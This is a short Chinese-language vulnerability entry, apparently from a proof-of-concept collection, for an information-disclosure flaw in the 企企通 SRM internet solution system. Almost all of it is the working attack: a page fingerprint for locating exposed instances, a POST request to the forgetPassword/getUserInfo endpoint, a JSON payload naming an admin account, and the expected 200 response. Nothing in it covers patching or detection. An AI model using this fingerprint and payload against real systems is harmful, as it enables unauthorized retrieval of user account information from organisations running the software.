# 企企通互联网解决方案系统srmgetuserinfo存在信息泄露漏洞

企企通互联网解决方案系统 ｜ 信息泄露 ｜ —
- **指纹**：`body="welcome-srm-wrap"`
- **请求**：`POST /els/account/forgetPassword/getUserInfo?_t=1735121436 HTTP/1.1`

**Payload**
```
{"account":"100000_admin"}
```
- **响应特征**：200